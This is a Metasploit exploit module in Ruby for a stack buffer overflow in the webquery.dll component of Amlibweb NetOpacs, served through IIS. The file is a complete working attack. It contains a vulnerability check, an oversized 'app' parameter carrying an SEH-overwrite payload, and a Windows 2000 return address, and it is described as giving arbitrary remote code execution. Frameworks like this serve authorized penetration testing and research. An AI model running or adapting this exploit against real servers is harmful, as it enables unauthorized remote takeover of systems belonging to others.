##
# $Id: amlibweb_webquerydll_app.rb 9953 2010-08-03 16:17:43Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'         => 'Amlibweb NetOpacs webquery.dll Stack Overflow',
			'Description'  => %q{
					This module exploits a stack overflow in Amlib's Amlibweb
				Library Management System (NetOpacs). The webquery.dll
				API is available through IIS requests. By specifying
				an overly long string to the 'app' parameter, SeH can be
				reliably overwritten allowing for arbitrary remote code execution.
				In addition, it is possible to overwrite EIP by specifying
				an arbitrary parameter name with an '=' terminator.
			},
			'Author'       => [ 'patrick' ],
			'Arch'         => [ ARCH_X86 ],
			'License'      => MSF_LICENSE,
			'Version'      => '$Revision: 9953 $',
			'References'   =>
				[
					[ 'OSVDB', '66814'],
					[ 'URL', 'http://www.aushack.com/advisories/' ],
				],
			'Privileged'		=> true,
			'DefaultOptions'	=>
				{
					'EXITFUNC'	=> 'thread',
				},
			'Payload'		=>
				{
					'Space'			=> 600,
					'BadChars' 		=> "\x00\x0a\x0d\x20%=?\x2f\x5c\x3a\x3d\@;!$",
					'EncoderType'		=> Msf::Encoder::Type::AlphanumMixed,
					'DisableNops'  		=>  'True',
					'StackAdjustment' 	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
				[
					# patrickw - Tested OK 20100803 w2k IIS5
					[ 'Windows 2000 Pro All - English', { 'Ret' => 0x75022ac4 } ], # p/p/r ws2help.dll - 'dll?app={buff}' for SeH IIS5
					# [ 'Windows 2003 Server All - English', { 'Ret' => 0x44434241 } ], # todo: 'dll?{buff}=' call edi for EIP in IIS6 w3wp.exe, 120 byte limit, ASCII only.
				],
			'DisclosureDate' => 'Aug 03 2010', #0day
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(80),
			],self.class)
	end

	def check
		connect

		rand = Rex::Text.rand_text_alpha(10)

		sock.put("GET /amlibweb/webquery.dll?#{rand}= HTTP/1.0\r\n\r\n")
		res = sock.get(-1,3)
		disconnect

		if (res =~ /<H1>BAD REQUEST<\/H1><P>Your client sent a request that this server didn't understand.<br>Request:\s(\w+)/)
			if ($1 == rand)
				return Exploit::CheckCode::Vulnerable
			end
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		connect
		seh = generate_seh_payload(target.ret)

		buffer = Rex::Text.rand_text_alphanumeric(3028) + seh
		sploit = "GET /amlibweb/webquery.dll?app="  + buffer + " HTTP/1.0\r\n"
		sock.put(sploit + "\r\n\r\n")

		handler
		disconnect
	end
end
